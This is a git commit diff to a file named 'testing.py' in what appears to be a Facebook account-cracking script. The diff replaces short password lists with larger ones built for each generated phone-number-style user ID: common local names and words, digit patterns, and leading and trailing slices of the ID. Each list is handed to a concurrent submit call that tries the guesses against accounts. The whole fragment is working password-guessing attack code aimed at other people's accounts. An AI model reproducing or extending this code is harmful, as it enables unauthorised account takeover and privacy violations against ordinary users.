817204c201739b06a42801c338774b64cd80294a
SHANTO-KING <143583631+SHANTO-KING@users.noreply.github.com>
2023-11-09 06:10:39 +0600

    Add files via upload

--- testing.py
+++ testing.py
@@ -293,9 +293,15 @@ def numb():
         for i in user:
             uid=code+i
             fb=tsg
-            pwx = [love,love[2:],code+love[:3],'FreeFire','Pubg123','TikTok','Asraf']
-            uid = code+love
-            draco_crack.submit(Asrafm,uid,pwx,tl)
+            pwx = [code,'bangladesh','i love you','nusrat','shahin','fatema','hridoy','mababa','@@@###','@#@#@#','405060','708090','445566','778899']
+            pwx.append(uid[5:])#back 6
+            pwx.append(uid[4:])#back 7
+            pwx.append(uid[3:])#back 8
+            pwx.append(uid[:6])#front 6
+            pwx.append(uid[:7])#front 7
+            pwx.append(uid[:8])#front 8
+            pwx.append(uid)# 11
+            feel.submit(need,uid,pwx,fb,tl)
 
 
 
